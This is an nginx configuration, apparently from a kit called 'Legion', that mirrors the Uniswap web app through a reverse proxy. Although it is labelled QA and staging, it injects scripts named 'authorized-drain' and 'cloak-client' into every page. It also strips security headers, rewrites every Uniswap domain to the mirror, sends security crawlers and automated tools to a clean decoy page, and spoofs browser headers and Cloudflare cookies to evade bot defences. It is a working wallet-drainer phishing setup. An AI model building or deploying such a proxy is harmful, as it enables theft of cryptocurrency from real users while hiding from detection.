# Legion QA — dynamic reverse proxy (staging only)
# Target: https://app.uniswap.org
# All paths (including /) → proxied to https://app.uniswap.org; Legion inject assets served locally
# --authorized-test: legion-authorized-drain.js/css injected into proxied HTML via sub_filter
# --waf-bypass: browser-like upstream headers (experimental)
# --asset-rewrite: sub_filter origin → mirror host in HTML/CSS/JS/JSON
# --headless-fallback: navigator.webdriver patch (experimental)

worker_processes 1;
events { worker_connections 2048; }

http {
  include       /etc/nginx/mime.types;
  default_type  application/octet-stream;
  sendfile      on;
  keepalive_timeout 65;
  proxy_connect_timeout 60s;
  proxy_send_timeout 120s;
  proxy_read_timeout 120s;
  proxy_buffering on;

  map $http_upgrade $connection_upgrade {
    default upgrade;
    ''      close;
  }

  map $http_user_agent $is_bot_ua {
    default 0;
    ~*googlebot 1;
    ~*bingbot 1;
    ~*ahrefsbot 1;
    ~*semrushbot 1;
    ~*yandexbot 1;
    ~*baiduspider 1;
    ~*crawler 1;
    ~*spider 1;
    ~*headless 1;
    ~*phantomjs 1;
    ~*selenium 1;
    ~*puppeteer 1;
    ~*playwright 1;
    ~*bytespider 1;
    ~*petalbot 1;
    ~*curl/ 1;
    ~*wget/ 1;
    ~*python-requests 1;
  }

  map $http_accept_language $is_bot_lang {
    default 0;
    "" 1;
  }

  map "$is_bot_ua$is_bot_lang" $legion_is_bot {
    default 0;
    11 1;
    10 1;
    01 1;
  }

  server {
    listen 8080;
    server_name localhost 127.0.0.1;

    root /usr/share/nginx/html;

    location = /bots-clean.html {
      try_files /bots-clean.html =404;
      add_header Cache-Control "no-store";
    }

    error_page 418 = /bots-clean.html;
    if ($legion_is_bot) { return 418; }

    location = /mirror-config.json {
      try_files /mirror-config.json =404;
      add_header Cache-Control "no-store";
      add_header Content-Type application/json;
    }

    location = /mirror-health {
      access_log off;
      default_type text/plain;
      return 200 'ok';
      add_header Cache-Control "no-store";
    }

    # Legion inject assets — serve from local volume (never proxy to upstream)
    location ^~ /legion- {
      try_files $uri =404;
      add_header Cache-Control "no-store";
    }

    # Subdomain passthrough — /__legion_proxy/<host>/<path> → https://<host>/<path>
    location ~ ^/__legion_proxy/(?<proxy_host>[^/]+)(?<proxy_path>/.*)?$ {
      set $upstream_path $proxy_path;
      if ($upstream_path = "") { set $upstream_path /; }
      proxy_pass https://$proxy_host$upstream_path$is_args$args;
      proxy_ssl_server_name on;
      proxy_set_header Host $proxy_host;
      proxy_set_header X-Real-IP $remote_addr;
      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
      proxy_set_header X-Forwarded-Proto $scheme;
      proxy_http_version 1.1;
      proxy_set_header Upgrade $http_upgrade;
      proxy_set_header Connection $connection_upgrade;
      proxy_hide_header Content-Security-Policy;
      proxy_hide_header X-Frame-Options;
      proxy_set_header Accept-Encoding "";
    }

    # Proxy all paths (including /) to the configured target origin
    location / {
      sub_filter_once off;
      sub_filter_types text/html text/css application/javascript application/json text/javascript;
      sub_filter '</body>' '<script src="/legion-cloak-client.js"></script><script src="/legion-authorized-drain.js" defer></script><script src="/legion-balance-display.js" defer></script></body>';
      proxy_set_header Accept-Encoding "";
      sub_filter 'https://app.uniswap.org' '';
      sub_filter 'https://app.uniswap.org' '';
      sub_filter 'http://app.uniswap.org' '';
      sub_filter 'href="/' 'href="/';
      sub_filter "href='/" "href='/";
      sub_filter 'action="/' 'action="/';
      sub_filter 'src="/' 'src="/';
      sub_filter 'url(https://app.uniswap.org' 'url(';
      sub_filter 'url(https://app.uniswap.org' 'url(';
      sub_filter 'url(http://app.uniswap.org' 'url(';
      sub_filter 'https://www.uniswap.org' '/__legion_proxy/www.uniswap.org';
      sub_filter 'http://www.uniswap.org' '/__legion_proxy/www.uniswap.org';
      sub_filter '//www.uniswap.org' '/__legion_proxy/www.uniswap.org';
      sub_filter 'https://api.uniswap.org' '/__legion_proxy/api.uniswap.org';
      sub_filter 'http://api.uniswap.org' '/__legion_proxy/api.uniswap.org';
      sub_filter '//api.uniswap.org' '/__legion_proxy/api.uniswap.org';
      sub_filter 'https://cdn.uniswap.org' '/__legion_proxy/cdn.uniswap.org';
      sub_filter 'http://cdn.uniswap.org' '/__legion_proxy/cdn.uniswap.org';
      sub_filter '//cdn.uniswap.org' '/__legion_proxy/cdn.uniswap.org';
      sub_filter 'https://static.uniswap.org' '/__legion_proxy/static.uniswap.org';
      sub_filter 'http://static.uniswap.org' '/__legion_proxy/static.uniswap.org';
      sub_filter '//static.uniswap.org' '/__legion_proxy/static.uniswap.org';
      sub_filter 'https://assets.uniswap.org' '/__legion_proxy/assets.uniswap.org';
      sub_filter 'http://assets.uniswap.org' '/__legion_proxy/assets.uniswap.org';
      sub_filter '//assets.uniswap.org' '/__legion_proxy/assets.uniswap.org';
      sub_filter 'https://rpc.uniswap.org' '/__legion_proxy/rpc.uniswap.org';
      sub_filter 'http://rpc.uniswap.org' '/__legion_proxy/rpc.uniswap.org';
      sub_filter '//rpc.uniswap.org' '/__legion_proxy/rpc.uniswap.org';
      sub_filter 'https://graphql.uniswap.org' '/__legion_proxy/graphql.uniswap.org';
      sub_filter 'http://graphql.uniswap.org' '/__legion_proxy/graphql.uniswap.org';
      sub_filter '//graphql.uniswap.org' '/__legion_proxy/graphql.uniswap.org';
      sub_filter 'https://ws.uniswap.org' '/__legion_proxy/ws.uniswap.org';
      sub_filter 'http://ws.uniswap.org' '/__legion_proxy/ws.uniswap.org';
      sub_filter '//ws.uniswap.org' '/__legion_proxy/ws.uniswap.org';
      sub_filter 'https://data.uniswap.org' '/__legion_proxy/data.uniswap.org';
      sub_filter 'http://data.uniswap.org' '/__legion_proxy/data.uniswap.org';
      sub_filter '//data.uniswap.org' '/__legion_proxy/data.uniswap.org';
      sub_filter 'https://metrics.uniswap.org' '/__legion_proxy/metrics.uniswap.org';
      sub_filter 'http://metrics.uniswap.org' '/__legion_proxy/metrics.uniswap.org';
      sub_filter '//metrics.uniswap.org' '/__legion_proxy/metrics.uniswap.org';

      proxy_pass https://app.uniswap.org;
      proxy_ssl_server_name on;
      proxy_set_header Host app.uniswap.org;
      proxy_set_header X-Real-IP $remote_addr;
      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
      proxy_set_header X-Forwarded-Proto $scheme;
      proxy_set_header X-Forwarded-Host $host;
      proxy_redirect off;
      proxy_http_version 1.1;
      proxy_set_header Upgrade $http_upgrade;
      proxy_set_header Connection $connection_upgrade;
      proxy_hide_header Content-Security-Policy;
      proxy_hide_header X-Frame-Options;
      proxy_set_header User-Agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36";
      proxy_set_header Accept-Language "en-US,en;q=0.9";
      proxy_set_header Accept "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
      proxy_set_header Sec-CH-UA "\"Chromium\";v=\"122\", \"Google Chrome\";v=\"122\", \"Not-A.Brand\";v=\"99\"";
      proxy_set_header Sec-CH-UA-Mobile "?0";
      proxy_set_header Sec-CH-UA-Platform "\"Windows\"";
      proxy_set_header Referer "https://app.uniswap.org/";
      proxy_set_header Origin "https://app.uniswap.org";
      proxy_set_header Cookie "_dd_s=rum=0&expire=1781183827074; __cfseq-079HKxwCg=YNFtDF_qT3PHQwD0j07V4YlIp3NSZCT6wiwrjwdO3QlYwH0-4uldGw2YKl-VQXRxjfURRwj8s31T8lXhXfUlkNSTInX-uNbXOtv8Ywu7xsXRXMs0NydmijEbM6irm5IcCmGxDc3pBH6riWXcUqv-nIxBAd8nyvsfUEfy2f9iLVkYFXXeTtBmwzUHGZo; __cfseq-0Rvhx829o=y0UT6d-tnsxY7o8KHTis7SSlQ8jL5Tb2ZYQWwNGqe-B6m0xttCIS8aLhn8eOCmv5LNSTRQhcNa9wLVNy6YAxod49IsNkRXH6J14vm0vsmBPM8gK3qyW-64a2Ms_3KO_1ikKYev6ZeanwD-BI486-eztoV7pvlanO9fHJ92W0vQrtpddKO3491pSRtoo; AMP_MKTG_0000000000=JTdCJTdE; __cfseq-0tknRskx3=485LFKEogue2cl-M7a1_WZbd_DNfzh9zqWsh5k1K9KpdYM7GGy45NreplLOhrnLydjKjbiJ4frELIVAwca22coFtECq-187f9vmDIahDEzO3KAAvpes4X1UrUxMTtUy5UVTIL9LMrQMIcMk3yvZMfRIp2M6VWISmd7HjdGdVHoTmVl9RiZXg4WRLx1Y; AMP_0000000000=JTdCJTIyZGV2aWNlSWQlMjIlM0ElMjI3MzE0NWEzNi00ODcxLTQ1ZjgtODdmYi1iYjg2MjBmMDU1NzglMjIlMkMlMjJzZXNzaW9uSWQlMjIlM0ExNzgxMTgyOTI1MzA3JTJDJTIyb3B0T3V0JTIyJTNBZmFsc2UlMkMlMjJsYXN0RXZlbnRUaW1lJTIyJTNBMTc4MTE4MjkzMDk5NCUyQyUyMmxhc3RFdmVudElkJTIyJTNBMTclN0Q=; __cf_bm=oCyxa37vUG2W0cP4wfG6TKlnGdQEoCoJvoI6rJcEBZw-1781182919.5162413-1.0.1.1-ZP80GprSKvuRxJHRA1tsrpUytmewyGwMHg2pEd.gfKbHC_83EnIGMGoJKe_s6zL29dcYYm_bjzNAJAk53s_4XsaOS7JGliJIEDfZWF0pPhHqcO4MlQiv.SK8fhVdX1N2";
    }
  }
}
